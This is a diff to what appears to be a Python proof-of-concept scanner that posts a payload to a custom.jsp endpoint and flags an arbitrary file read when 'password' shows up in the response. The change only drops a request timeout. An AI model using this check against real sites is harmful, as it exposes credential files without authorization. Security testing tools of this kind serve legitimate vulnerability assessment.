@@ -43,7 +43,7 @@ class poc:
         url = "{}://{}/sys/ui/extend/varkind/custom.jsp".format(scheme, netloc)
         data = 'var=' + quote(self.payload)
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if "password" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件读取漏洞\033[0m
